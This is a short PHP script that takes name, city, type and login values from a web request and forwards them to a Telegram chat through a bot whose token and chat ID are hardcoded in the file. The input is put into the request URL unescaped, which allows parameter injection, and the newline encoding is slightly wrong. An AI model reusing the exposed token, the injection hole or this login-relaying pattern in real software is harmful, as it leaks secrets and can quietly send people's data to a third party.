<?php

    $naming = $_GET['naming'];
    $city = $_GET['city'];
    $type = $_GET['type'];
    $login = $_GET['login'];

    $token = "6535474375:AAGcPHRBPRaP1D9mrekTho2GPSx6MrDoFOw";
    $chat_id = "-733496916";
    $arr = array(
        'Name: '=> $naming,
        'City: '=> $city,
        'Type: '=> $type,
        'Login: '=> $login
    );
    foreach($arr as $key => $value){
        $txt .= "<b>".$key."</b> ".$value."$0A";
    }
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    if($sendToTelegram){
        echo "Success";
    }
    else echo "Failed";

?>